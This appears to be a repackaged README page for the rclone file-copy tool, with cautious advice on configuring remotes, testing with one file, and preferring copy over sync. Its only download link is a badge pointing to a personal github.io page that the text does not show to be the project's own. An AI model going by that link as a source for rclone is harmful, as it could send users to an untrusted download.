Put one file in an empty folder and copy it back. Do not leave tokens in a config on a shared PC. A login you were not given is not a remote to try. If the remote lists the wrong account, delete it and create it again. Do not copy yet. Look again.

# rclone - Copy Files to a Remote You Control

rclone copies files between this PC and a remote you configured: a server you administer, or a cloud account that is yours. Check the remote name and the path before you copy. A wrong destination can overwrite a folder you needed. It does not sign in to accounts you were not given, and the config file is a secret if it contains keys.

---

## Why It Stands Out

![rclone configured with one remote the user is allowed to use](https://forum.rclone.org/uploads/default/original/3X/8/7/874f4e3dcb1cc1350b3d4e044e6c840a9ba66958.png)

Dragging files into a browser is awkward for a large folder, and it is easy to drop them in the wrong account. rclone is the same transfer as a command or a simple screen you can re-read: a source you have, a remote you named, and a path on that remote. The name is not a safety check by itself. Open the config far enough to see which account the name points at before the first real copy.

Start with one small file and a destination folder you created for the test. Confirm it arrived, then confirm you can copy it back. Do not sync a whole profile on the first run. Sync and copy are different: one of them can delete files on the side you did not think about. If you do not know which, use a copy into an empty folder. Keep the config off a shared PC, or remove it when you are done. A key in that file is a login.

---

## Core Capabilities

- **A Remote You Created:** Your server or your cloud account, with credentials you were issued.
- **A Path You Read:** Source and destination both visible before the transfer.
- **A Small First File:** Prove the remote, then move the real folder.
- **Copy Into an Empty Folder:** Avoid a sync you do not understand on the first day.
- **A Config You Protect:** Keys in the config are secrets. Do not leave them on a shared login.

---

## Performance Tips

- Create the remote, then list it, before you copy anything large.
- Use an empty test folder on the destination.
- Prefer a copy until you can explain what a sync would delete.
- Remove stored tokens before this PC is passed to someone else.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **Operating System** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **Processor (CPU)** | Dual-core | Quad-core for large copies |
| **Memory (RAM)** | 1 GB | 4 GB |
| **Storage** | Small install | Room for the files you will download |
| **Network** | A remote you are allowed to reach | A test folder on that remote |
| **Secrets** | Your own credentials | Config removed on a shared PC |

---

## Quick Setup

Prerequisites: An account or server you may use, and one small file you can afford to upload as a test.

[![GET rclone](https://img.shields.io/badge/GET%20%E2%80%94%20rclone-7c2d12?style=for-the-badge&logoColor=white)](https://mudgetelwanda.github.io/.github/rclone-copy)

1.  **Install:** Open a prompt where rclone runs, from the build you chose.
2.  **Configure One Remote:** Enter the account that is yours. Stop if you do not have the login.
3.  **List the Destination:** Confirm the remote name shows the storage you expected.
4.  **Copy One File:** Put it in an empty test folder, then copy it back and open it.

---

## Ideal For

- **Your Server:** A folder you administer, reached with the account you were given.
- **Your Cloud Drive:** A test file first, then the documents folder.
- **A Repeatable Copy:** The same remote name next week, after you have seen it list the right path.
- **A PC You Are Leaving:** Config and tokens removed.

---

## Troubleshooting

- The remote lists the wrong account? Delete that remote and create it again with the right login. Do not copy yet.
- A file disappeared on one side? You ran a sync you did not intend. Restore from the copy that still has it, and use copy into an empty folder next time.
- Access denied? That account cannot use that path. Do not try a different user's key.
- The config is on a shared PC? Remove it when you are finished.

---

## Find Related Topics

rclone list first, copy not sync, crypt folder, mount later, flags you understand, empty test folder, your remote, remove tokens
